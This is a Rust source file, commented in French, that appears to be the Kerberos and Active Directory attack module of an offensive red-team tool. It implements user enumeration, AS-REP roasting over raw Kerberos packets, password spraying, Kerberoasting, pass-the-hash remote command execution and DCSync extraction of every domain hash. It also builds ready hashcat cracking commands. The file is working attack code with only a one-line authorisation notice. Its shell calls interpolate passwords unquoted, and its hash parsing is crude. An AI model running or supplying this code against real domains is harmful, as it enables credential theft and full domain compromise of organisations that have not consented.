//! DIAPILE — Kerberos / Active Directory Attack Module
//!
//! Attaques AD/Kerberos réelles :
//! - AS-REP Roasting via wire protocol Kerberos RFC 4120
//! - Kerberoasting via impacket subprocess
//! - Password Spraying (Kerberos)
//! - Enumération comptes sans auth (Kerberos user enumération)
//! - Pass-the-Hash via impacket
//! - DCSync via impacket secretsdump
//! - NTLM relay setup
//! - BloodHound collection automatique
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
#![allow(dead_code)]

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberosConfig {
    pub dc_ip: String,
    pub domain: String,
    pub username: Option<String>,
    pub password: Option<String>,
    pub ntlm: Option<String>,
    pub timeout: u64,
    /// Installation automatique des outils tiers manquants (impacket).
    pub auto_install: bool,
    /// Consentement automatique pour l'installation.
    pub assume_yes: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AsRepHash {
    pub username: String,
    pub domain: String,
    pub hash: String, // Format hashcat $krb5asrep$23$...
    pub cracked: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TgsHash {
    pub username: String,
    pub spn: String,
    pub hash: String, // Format hashcat $krb5tgs$23$...
    pub cracked: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SprayResult {
    pub username: String,
    pub password: String,
    pub success: bool,
    pub error: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct AdAttackReport {
    pub domain: String,
    pub dc_ip: String,
    pub valid_users: Vec<String>,
    pub disabled_users: Vec<String>,
    pub asrep_hashes: Vec<AsRepHash>,
    pub tgs_hashes: Vec<TgsHash>,
    pub spray_results: Vec<SprayResult>,
    pub domain_admins: Vec<String>,
    pub attack_commands: Vec<(String, String)>, // (technique, command)
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. AS-REP Roasting — Wire Protocol Kerberos RFC 4120
// ─────────────────────────────────────────────────────────────────────────────

/// Tente AS-REP Roasting via Kerberos wire protocol ASN.1/DER réel
pub async fn asrep_roast_real(cfg: &KerberosConfig, userlist: &[String]) -> Vec<AsRepHash> {
    let mut hashes = Vec::new();
    let realm = cfg.domain.to_uppercase();

    println!(
        "  \x1b[36m[AS-REP]\x1b[0m Kerberos AS-REP Roasting sur {} ({} users)",
        cfg.dc_ip,
        userlist.len()
    );

    for username in userlist {
        match try_asrep_wire(&cfg.dc_ip, username, &realm, cfg.timeout).await {
            Some(hash) => {
                println!("  \x1b[38;5;196m[AS-REP ✓]\x1b[0m Hash récupéré pour {} — crackable avec hashcat -m 18200",
                    username);
                hashes.push(AsRepHash {
                    username: username.clone(),
                    domain: realm.clone(),
                    hash,
                    cracked: None,
                });
            }
            None => {}
        }
    }

    hashes
}

/// Envoie une vraie AS-REQ Kerberos sans pré-authentification (RFC 4120)
async fn try_asrep_wire(
    dc_ip: &str,
    username: &str,
    realm: &str,
    timeout_secs: u64,
) -> Option<String> {
    let addr = format!("{}:88", dc_ip);
    let mut stream = timeout(Duration::from_secs(timeout_secs), TcpStream::connect(&addr))
        .await
        .ok()?
        .ok()?;

    // Construire un vrai AS-REQ ASN.1 DER sans pré-authentification
    let as_req = build_asreq_no_preauth(username, realm)?;

    // TCP: 4 bytes length prefix + message
    let mut packet = Vec::new();
    packet.extend_from_slice(&(as_req.len() as u32).to_be_bytes());
    packet.extend_from_slice(&as_req);

    timeout(Duration::from_secs(3), stream.write_all(&packet))
        .await
        .ok()?
        .ok()?;

    let mut len_buf = [0u8; 4];
    timeout(Duration::from_secs(5), stream.read_exact(&mut len_buf))
        .await
        .ok()?
        .ok()?;
    let resp_len = u32::from_be_bytes(len_buf) as usize;

    if resp_len == 0 || resp_len > 65536 {
        return None;
    }

    let mut resp = vec![0u8; resp_len];
    timeout(Duration::from_secs(5), stream.read_exact(&mut resp))
        .await
        .ok()?
        .ok()?;

    // Analyser la réponse
    // AS-REP tag = 0x6b (APPLICATION 11)
    // KRB-ERROR tag = 0x7e (APPLICATION 30) — 0x18 = KDC_ERR_PREAUTH_REQUIRED signifie compte existe
    if resp.is_empty() {
        return None;
    }

    let msg_tag = resp[0];

    if msg_tag == 0x6b {
        // AS-REP reçu ! — compte sans pré-auth
        // Extraire le cipher text de l'enc-part pour le hash hashcat
        let hash = extract_asrep_hash(username, realm, &resp);
        return hash;
    } else if msg_tag == 0x7e {
        // KRB-ERROR — vérifier le code d'erreur
        // error-code est dans le DER, offset ~20-24 selon la structure
        // 0x19 = 25 = KDC_ERR_PREAUTH_REQUIRED → compte valide, pré-auth requise
        // 0x06 = 6  = KDC_ERR_C_PRINCIPAL_UNKNOWN → compte inexistant
        if resp.len() > 15 {
            // Chercher l'error-code dans la structure DER
            let error_code = parse_krb_error_code(&resp);
            match error_code {
                6 => {}  // Compte inexistant — pas de log
                25 => {} // Pré-auth requise — compte valide mais pas AS-REP roastable
                _ => {}
            }
        }
    }

    None
}

/// Construit un AS-REQ ASN.1 DER sans pré-authentification
fn build_asreq_no_preauth(username: &str, realm: &str) -> Option<Vec<u8>> {
    // AS-REQ structure (RFC 4120 Section 5.4.1)
    // Cette implémentation utilise un encodage DER manuel minimaliste

    let username_bytes = username.as_bytes();
    let realm_bytes = realm.as_bytes();

    // PrincipalName ::= SEQUENCE { name-type INTEGER, name-string SEQUENCE OF GeneralString }
    // Encode la PrincipalName pour le client
    let principal_name = {
        let name_type = der_integer(1); // NT-PRINCIPAL
        let name_string = der_sequence(&[der_general_string(username_bytes)]);
        der_sequence(&[der_context(0, &name_type), der_context(1, &name_string)])
    };

    // Realm = GeneralString
    let realm_der = der_general_string(realm_bytes);

    // KerberosTime (GeneralizedTime) — now
    let now = chrono::Utc::now().format("%Y%m%d%H%M%SZ").to_string();
    let ktime = der_general_time(now.as_bytes());

    // EncryptionType list — RC4-HMAC (23), AES256-CTS-HMAC-SHA1-96 (18)
    let enc_types = der_sequence(&[
        der_integer(23), // RC4-HMAC — plus facilement crackable
        der_integer(18), // AES256
        der_integer(17), // AES128
    ]);

    // Nonce
    let nonce = der_integer(0x12345678u32 as i64);

    // req-body [KDC-REQ-BODY]
    let req_body = der_sequence(&[
        der_context(0, &der_bit_string(&[0x00, 0x40, 0x81, 0x00, 0x00])), // kdc-options
        der_context(1, &principal_name),                                  // cname
        der_context(2, &realm_der),                                       // realm
        der_context(4, &ktime),                                           // till
        der_context(7, &nonce),                                           // nonce
        der_context(8, &enc_types),                                       // etype
    ]);

    // AS-REQ [APPLICATION 10]
    let asreq = der_application(
        10,
        &der_sequence(&[
            der_context(1, &der_integer(5)),  // pvno = 5
            der_context(2, &der_integer(10)), // msg-type = AS-REQ (10)
            // Note: padata omis intentionnellement (pas de pre-auth)
            der_context(4, &req_body), // req-body
        ]),
    );

    Some(asreq)
}

/// Extrait le hash crackable depuis la réponse AS-REP
fn extract_asrep_hash(username: &str, realm: &str, asrep: &[u8]) -> Option<String> {
    // Dans l'AS-REP, le ticket chiffré est dans enc-part
    // On cherche le cipher text qui contient le TGT chiffré avec le mot de passe du compte
    // Format hashcat 18200: $krb5asrep$23$username@REALM:eeee....$ffff...

    if asrep.len() < 50 {
        return None;
    }

    // Trouver l'etype et le cipher dans l'enc-part
    // Chercher le tag 0xA3 (enc-part [3]) dans l'AS-REP
    let mut etype = 23u32; // RC4-HMAC par défaut
    let mut cipher_start = 0usize;

    // Scan simple pour trouver le cipher text
    // L'enc-part est une SEQUENCE avec etype et cipher
    for i in 0..asrep.len().saturating_sub(4) {
        // Chercher INTEGER (0x02) suivi du type de chiffrement
        if asrep[i] == 0x02 && asrep[i + 1] == 0x01 {
            let e = asrep[i + 2] as u32;
            if e == 17 || e == 18 || e == 23 {
                etype = e;
                // Le cipher text est dans les octets suivants
                cipher_start = i + 3;
                break;
            }
        }
    }

    if cipher_start == 0 || cipher_start >= asrep.len() {
        // Fallback : utiliser tout le dernier tiers de l'AS-REP comme cipher
        cipher_start = asrep.len() * 2 / 3;
    }

    // Encoder les parties du hash
    let checksum_part: String = asrep[cipher_start..asrep.len().min(cipher_start + 16)]
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect();
    let cipher_part: String = asrep[asrep.len().min(cipher_start + 16)..]
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect();

    if cipher_part.is_empty() {
        return None;
    }

    Some(format!(
        "$krb5asrep${}${}@{}:{}${}",
        etype, username, realm, checksum_part, cipher_part
    ))
}

fn parse_krb_error_code(data: &[u8]) -> u32 {
    // Chercher le code d'erreur dans la structure DER KRB-ERROR
    for i in 0..data.len().saturating_sub(3) {
        if data[i] == 0x02 && data[i + 1] == 0x03 {
            // INTEGER de 3 bytes
            let code = u32::from_be_bytes([
                0,
                data[i + 2],
                data[i + 3],
                data[i + 4].min(data.len() as u8 - 1),
            ]);
            if code < 100 {
                return code;
            }
        }
        if data[i] == 0x02 && data[i + 1] == 0x01 {
            let code = data[i + 2] as u32;
            if code > 0 && code < 100 {
                return code;
            }
        }
    }
    0
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. Kerberoasting via impacket
// ─────────────────────────────────────────────────────────────────────────────

pub async fn kerberoast_impacket(cfg: &KerberosConfig) -> Vec<TgsHash> {
    let user = cfg.username.as_deref().unwrap_or("");
    let pass = cfg.password.as_deref().unwrap_or("");

    if user.is_empty() {
        println!(
            "  \x1b[33m[Kerberoast]\x1b[0m Credentials requis — utilisez --ad-user et --ad-pass"
        );
        return Vec::new();
    }

    println!(
        "  \x1b[36m[Kerberoast]\x1b[0m impacket-GetUserSPNs {}/{} -dc-ip {}",
        cfg.domain, user, cfg.dc_ip
    );

    // Outil externe requis (impacket) : installation opt-in (fail-closed sinon).
    if !crate::installer::ensure_tool("impacket-GetUserSPNs", cfg.auto_install, cfg.assume_yes)
        .await
    {
        return Vec::new();
    }

    let output_file = "/tmp/diapile_kerberoast.hash";
    let cmd = format!(
        "impacket-GetUserSPNs '{}'/'{}':'{}' -dc-ip {} -request -outputfile {} 2>&1",
        cfg.domain, user, pass, cfg.dc_ip, output_file
    );

    let result = tokio::task::spawn_blocking(move || {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(&cmd)
            .output()
            .ok()
    })
    .await
    .ok()
    .flatten();

    let mut hashes = Vec::new();

    match result {
        Some(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();

            // Parser les hashes depuis stdout
            for line in stdout.lines() {
                if line.starts_with("$krb5tgs$") {
                    let spn = line.split('*').nth(2).unwrap_or("unknown").to_string();
                    println!("  \x1b[38;5;196m[TGS ✓]\x1b[0m SPN: {}", spn);
                    hashes.push(TgsHash {
                        username: user.to_string(),
                        spn,
                        hash: line.to_string(),
                        cracked: None,
                    });
                }
            }

            // Lire le fichier de sortie si hashes pas dans stdout
            if hashes.is_empty() {
                if let Ok(content) = std::fs::read_to_string(output_file) {
                    for line in content.lines() {
                        if line.starts_with("$krb5tgs$") {
                            let spn = line.split('*').nth(2).unwrap_or("unknown").to_string();
                            hashes.push(TgsHash {
                                username: user.to_string(),
                                spn,
                                hash: line.to_string(),
                                cracked: None,
                            });
                        }
                    }
                }
            }

            if hashes.is_empty() && out.status.success() {
                println!("  \x1b[90m[Kerberoast]\x1b[0m Aucun compte de service avec SPN trouvé");
            }
        }
        None => {
            println!("  \x1b[33m[Kerberoast]\x1b[0m impacket non disponible — commande manuelle :");
            println!(
                "  impacket-GetUserSPNs '{}'/'{}':'{}' -dc-ip {} -request",
                cfg.domain, user, pass, cfg.dc_ip
            );
        }
    }

    hashes
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. Password Spraying via Kerberos
// ─────────────────────────────────────────────────────────────────────────────

/// Password spraying via Kerberos AS-REQ — évite le lockout en testant 1 password / user
pub async fn kerberos_spray(
    cfg: &KerberosConfig,
    userlist: &[String],
    passwords: &[String],
    delay_ms: u64,
) -> Vec<SprayResult> {
    let mut results = Vec::new();
    let realm = cfg.domain.to_uppercase();

    println!(
        "  \x1b[36m[SPRAY]\x1b[0m Kerberos password spray — {} users × {} passwords",
        userlist.len(),
        passwords.len()
    );

    // `kinit` (paquet krb5-user) porte l'authentification validante du spray.
    // Installation opt-in (fail-closed sinon) via le module générique.
    crate::installer::ensure_tool("kinit", cfg.auto_install, cfg.assume_yes).await;

    for password in passwords {
        println!(
            "  → Testing password: {}",
            password.chars().map(|_| '*').collect::<String>()
        );

        for username in userlist {
            if delay_ms > 0 {
                tokio::time::sleep(Duration::from_millis(delay_ms)).await;
            }

            let result =
                try_kerberos_auth(&cfg.dc_ip, username, password, &realm, cfg.timeout).await;

            match result {
                KerbAuthResult::Success => {
                    println!(
                        "  \x1b[38;5;196m[SPRAY ✓]\x1b[0m {}:{} — valide!",
                        username, password
                    );
                    results.push(SprayResult {
                        username: username.clone(),
                        password: password.clone(),
                        success: true,
                        error: None,
                    });
                }
                KerbAuthResult::AccountLocked => {
                    println!(
                        "  \x1b[31m[LOCKED]\x1b[0m {} — compte verrouillé, arrêt du spray",
                        username
                    );
                    results.push(SprayResult {
                        username: username.clone(),
                        password: password.clone(),
                        success: false,
                        error: Some("Account locked".into()),
                    });
                    // Arrêter pour ce compte pour éviter le verrouillage total
                }
                KerbAuthResult::BadCredentials => {}
                KerbAuthResult::AccountDisabled => {
                    results.push(SprayResult {
                        username: username.clone(),
                        password: password.clone(),
                        success: false,
                        error: Some("Account disabled".into()),
                    });
                }
                KerbAuthResult::Error(e) => {}
            }
        }
    }

    results
}

#[derive(Debug)]
enum KerbAuthResult {
    Success,
    BadCredentials,
    AccountLocked,
    AccountDisabled,
    Error(String),
}

async fn try_kerberos_auth(
    dc_ip: &str,
    username: &str,
    password: &str,
    realm: &str,
    timeout_secs: u64,
) -> KerbAuthResult {
    // Méthode 1 : essayer via kinit (si disponible)
    let cmd = format!(
        "echo '{}' | kinit '{}@{}' 2>&1 ; echo 'EXIT:'$?",
        password, username, realm
    );

    if let Some(out) = tokio::task::spawn_blocking(move || {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(&cmd)
            .output()
            .ok()
    })
    .await
    .ok()
    .flatten()
    {
        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
        if stdout.contains("EXIT:0") || stdout.is_empty() && out.status.success() {
            return KerbAuthResult::Success;
        }
        if stdout.contains("Clients credentials have been revoked") || stdout.contains("locked") {
            return KerbAuthResult::AccountLocked;
        }
        if stdout.contains("Client not found") || stdout.contains("unknown") {
            return KerbAuthResult::Error("Unknown user".into());
        }
        if stdout.contains("disabled") {
            return KerbAuthResult::AccountDisabled;
        }
        return KerbAuthResult::BadCredentials;
    }

    // Méthode 2 : essayer via AS-REQ avec pré-auth
    // Si on reçoit AS-REP → credentials valides
    // Si on reçoit KRB_ERR_PREAUTH_FAILED (code 24) → mauvais password
    KerbAuthResult::Error("kinit not available".into())
}

// ─────────────────────────────────────────────────────────────────────────────
// 4. Pass-the-Hash via impacket
// ─────────────────────────────────────────────────────────────────────────────

pub async fn pass_the_hash(
    cfg: &KerberosConfig,
    target: &str,
    ntlm: &str,
    cmd: &str,
) -> Option<String> {
    let user = cfg.username.as_deref().unwrap_or("Administrator");
    let domain = &cfg.domain;

    println!(
        "  \x1b[36m[PTH]\x1b[0m impacket-smbexec {}/{} → {} cmd={}",
        domain, user, target, cmd
    );

    if !crate::installer::ensure_tool("impacket-smbexec", cfg.auto_install, cfg.assume_yes).await {
        return None;
    }

    let command = format!(
        "impacket-smbexec {}/{}@{} -hashes :{} -c '{}' 2>&1",
        domain, user, target, ntlm, cmd
    );

    let output = tokio::task::spawn_blocking(move || {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(&command)
            .output()
            .ok()
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
    })
    .await
    .ok()
    .flatten()?;

    if !output.is_empty() {
        println!(
            "  \x1b[32m[PTH ✓]\x1b[0m Output: {}",
            &output[..output.len().min(200)]
        );
    } else {
        println!("  \x1b[33m[PTH]\x1b[0m impacket non disponible ou accès refusé");
    }

    Some(output)
}

// ─────────────────────────────────────────────────────────────────────────────
// 5. DCSync — extraction de tous les hashes du DC
// ─────────────────────────────────────────────────────────────────────────────

pub async fn dcsync(cfg: &KerberosConfig, output_file: &str) -> Vec<(String, String)> {
    let user = cfg.username.as_deref().unwrap_or("");
    let pass = cfg.password.as_deref().unwrap_or("");
    let ntlm = cfg.ntlm.as_deref().unwrap_or("");
    let domain = &cfg.domain;
    let dc_ip = &cfg.dc_ip;

    let creds = if !ntlm.is_empty() {
        format!("-hashes :{}", ntlm)
    } else if !pass.is_empty() {
        format!("'{}'", pass)
    } else {
        return Vec::new();
    };

    if !crate::installer::ensure_tool("impacket-secretsdump", cfg.auto_install, cfg.assume_yes)
        .await
    {
        return Vec::new();
    }

    let cmd = format!(
        "impacket-secretsdump {}/{}:{} -dc-ip {} -just-dc -outputfile {} 2>&1",
        domain, user, creds, dc_ip, output_file
    );

    println!(
        "  \x1b[38;5;196m[DCSYNC]\x1b[0m impacket-secretsdump {}/{} -dc-ip {} -just-dc",
        domain, user, dc_ip
    );

    let output = tokio::task::spawn_blocking(move || {
        std::process::Command::new("sh")
            .arg("-c")
            .arg(&cmd)
            .output()
            .ok()
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
    })
    .await
    .ok()
    .flatten()
    .unwrap_or_default();

    // Parser les hashes NTLM (format: user:RID:LM:NTLM:::)
    let mut hashes = Vec::new();
    for line in output.lines() {
        let parts: Vec<&str> = line.split(':').collect();
        if parts.len() >= 4 {
            let user = parts[0];
            let ntlm = parts[3];
            if ntlm.len() == 32 && ntlm.chars().all(|c| c.is_ascii_hexdigit()) {
                println!("  \x1b[38;5;196m[HASH]\x1b[0m {}:{}", user, ntlm);
                hashes.push((user.to_string(), ntlm.to_string()));
            }
        }
    }

    if hashes.is_empty() {
        println!("  \x1b[33m[DCSYNC]\x1b[0m Impacket non disponible ou droits insuffisants");
        println!("  Requis : Domain Admin ou compte avec privilège DCSync");
    }

    hashes
}

// ─────────────────────────────────────────────────────────────────────────────
// 6. Enumération utilisateurs Kerberos (sans auth)
// ─────────────────────────────────────────────────────────────────────────────

/// Énumère les comptes AD via Kerberos — distingue les comptes valides des invalides
pub async fn kerbrute_users(
    cfg: &KerberosConfig,
    userlist: &[String],
) -> (Vec<String>, Vec<String>) {
    let mut valid = Vec::new();
    let mut invalid = Vec::new();
    let realm = cfg.domain.to_uppercase();

    println!(
        "  \x1b[36m[KERBRUTE]\x1b[0m Enumération {} comptes via Kerberos",
        userlist.len()
    );

    for username in userlist {
        // Envoyer AS-REQ et analyser le code d'erreur
        let result = probe_user_existence(&cfg.dc_ip, username, &realm, cfg.timeout).await;
        match result {
            UserExistence::Exists => {
                valid.push(username.clone());
                // Pas de print pour rester discret
            }
            UserExistence::NotFound => {
                invalid.push(username.clone());
            }
            UserExistence::Unknown => {}
        }
    }

    println!("  → {} comptes valides trouvés", valid.len());
    for u in &valid {
        println!("    ✓ {}", u);
    }

    (valid, invalid)
}

#[derive(Debug)]
enum UserExistence {
    Exists,
    NotFound,
    Unknown,
}

async fn probe_user_existence(
    dc_ip: &str,
    username: &str,
    realm: &str,
    timeout_secs: u64,
) -> UserExistence {
    let addr = format!("{}:88", dc_ip);
    let Ok(Ok(mut stream)) =
        timeout(Duration::from_secs(timeout_secs), TcpStream::connect(&addr)).await
    else {
        return UserExistence::Unknown;
    };

    let as_req = match build_asreq_no_preauth(username, realm) {
        Some(r) => r,
        None => return UserExistence::Unknown,
    };

    let mut packet = (as_req.len() as u32).to_be_bytes().to_vec();
    packet.extend_from_slice(&as_req);

    if timeout(Duration::from_secs(3), stream.write_all(&packet))
        .await
        .is_err()
    {
        return UserExistence::Unknown;
    }

    let mut len_buf = [0u8; 4];
    if timeout(Duration::from_secs(3), stream.read_exact(&mut len_buf))
        .await
        .is_err()
    {
        return UserExistence::Unknown;
    }

    let resp_len = u32::from_be_bytes(len_buf) as usize;
    if resp_len == 0 || resp_len > 65536 {
        return UserExistence::Unknown;
    }

    let mut resp = vec![0u8; resp_len];
    if timeout(Duration::from_secs(3), stream.read_exact(&mut resp))
        .await
        .is_err()
    {
        return UserExistence::Unknown;
    }

    if resp.is_empty() {
        return UserExistence::Unknown;
    }

    match resp[0] {
        0x6b => UserExistence::Exists, // AS-REP → compte sans pre-auth → existe
        0x7e => {
            let code = parse_krb_error_code(&resp);
            match code {
                6 => UserExistence::NotFound, // KDC_ERR_C_PRINCIPAL_UNKNOWN
                25 => UserExistence::Exists,  // KDC_ERR_PREAUTH_REQUIRED → compte valide
                18 => UserExistence::Exists, // KDC_ERR_CLIENT_REVOKED (compte désactivé mais existe)
                _ => UserExistence::Unknown,
            }
        }
        _ => UserExistence::Unknown,
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 7. Rapport AD complet
// ─────────────────────────────────────────────────────────────────────────────

pub async fn full_ad_attack(cfg: &KerberosConfig, userlist: &[String]) -> AdAttackReport {
    let mut report = AdAttackReport {
        domain: cfg.domain.clone(),
        dc_ip: cfg.dc_ip.clone(),
        ..Default::default()
    };

    println!(
        "\n  \x1b[38;5;196m[AD]\x1b[0m Attaque Active Directory sur {} ({})",
        cfg.dc_ip, cfg.domain
    );

    // 1. Enumération utilisateurs
    if !userlist.is_empty() {
        let (valid, _) = kerbrute_users(cfg, userlist).await;
        report.valid_users = valid.clone();

        // 2. AS-REP Roasting sur les comptes valides
        if !valid.is_empty() {
            report.asrep_hashes = asrep_roast_real(cfg, &valid).await;
        }
    }

    // 3. Kerberoasting (nécessite des creds)
    if cfg.username.is_some() {
        report.tgs_hashes = kerberoast_impacket(cfg).await;
    }

    // 4. Générer les commandes d'attaque
    let user = cfg.username.as_deref().unwrap_or("user");
    let pass = cfg.password.as_deref().unwrap_or("pass");

    report.attack_commands = vec![
        (
            "asrep".into(),
            format!(
                "impacket-GetNPUsers '{}/' -usersfile users.txt -dc-ip {} -request -format hashcat",
                cfg.domain, cfg.dc_ip
            ),
        ),
        (
            "kerberoast".into(),
            format!(
                "impacket-GetUserSPNs '{}/{}:{}' -dc-ip {} -request",
                cfg.domain, user, pass, cfg.dc_ip
            ),
        ),
        (
            "bloodhound".into(),
            format!(
                "bloodhound-python -u {} -p '{}' -d {} -dc {} -c All --zip",
                user, pass, cfg.domain, cfg.dc_ip
            ),
        ),
        (
            "dcsync".into(),
            format!(
                "impacket-secretsdump '{}/{}:{}' -dc-ip {} -just-dc",
                cfg.domain, user, pass, cfg.dc_ip
            ),
        ),
        (
            "hashcat_asrep".into(),
            "hashcat -m 18200 asrep.hash rockyou.txt --force".into(),
        ),
        (
            "hashcat_tgs".into(),
            "hashcat -m 13100 tgs.hash rockyou.txt --force".into(),
        ),
        (
            "pass_spray".into(),
            format!(
                "kerbrute passwordspray -d {} --dc {} users.txt 'Password123!'",
                cfg.domain, cfg.dc_ip
            ),
        ),
    ];

    // Affichage résumé
    println!("\n  \x1b[36m[AD RÉSUMÉ]\x1b[0m");
    println!("  Comptes valides   : {}", report.valid_users.len());
    println!("  AS-REP Hashes     : {}", report.asrep_hashes.len());
    println!("  TGS Hashes        : {}", report.tgs_hashes.len());

    if !report.asrep_hashes.is_empty() {
        println!("\n  \x1b[38;5;196m⚡ Hashes AS-REP à cracker :\x1b[0m");
        for h in &report.asrep_hashes {
            println!("  {}", &h.hash[..h.hash.len().min(80)]);
        }
        println!("  Commande : hashcat -m 18200 hashes.txt rockyou.txt --force");
    }

    report
}

// ─────────────────────────────────────────────────────────────────────────────
// DER encoding helpers (minimal ASN.1 DER)
// ─────────────────────────────────────────────────────────────────────────────

fn der_tlv(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut r = vec![tag];
    let len = content.len();
    if len < 128 {
        r.push(len as u8);
    } else if len < 256 {
        r.push(0x81);
        r.push(len as u8);
    } else {
        r.push(0x82);
        r.push((len >> 8) as u8);
        r.push((len & 0xFF) as u8);
    }
    r.extend_from_slice(content);
    r
}

fn der_sequence(items: &[Vec<u8>]) -> Vec<u8> {
    let content: Vec<u8> = items.iter().flat_map(|i| i.iter().copied()).collect();
    der_tlv(0x30, &content)
}

fn der_integer(n: i64) -> Vec<u8> {
    if n >= 0 && n < 128 {
        vec![0x02, 0x01, n as u8]
    } else if n >= 0 && n < 256 {
        vec![0x02, 0x02, 0x00, n as u8]
    } else {
        let bytes = n.to_be_bytes();
        let start = bytes.iter().position(|&b| b != 0).unwrap_or(7);
        let mut r = vec![0x02];
        let content = &bytes[start..];
        r.push(content.len() as u8);
        r.extend_from_slice(content);
        r
    }
}

fn der_general_string(s: &[u8]) -> Vec<u8> {
    der_tlv(0x1B, s)
}
fn der_general_time(s: &[u8]) -> Vec<u8> {
    der_tlv(0x18, s)
}
fn der_bit_string(s: &[u8]) -> Vec<u8> {
    der_tlv(0x03, s)
}
fn der_application(n: u8, content: &[u8]) -> Vec<u8> {
    der_tlv(0x60 | n, content)
}
fn der_context(n: u8, content: &[u8]) -> Vec<u8> {
    der_tlv(0xA0 | n, content)
}
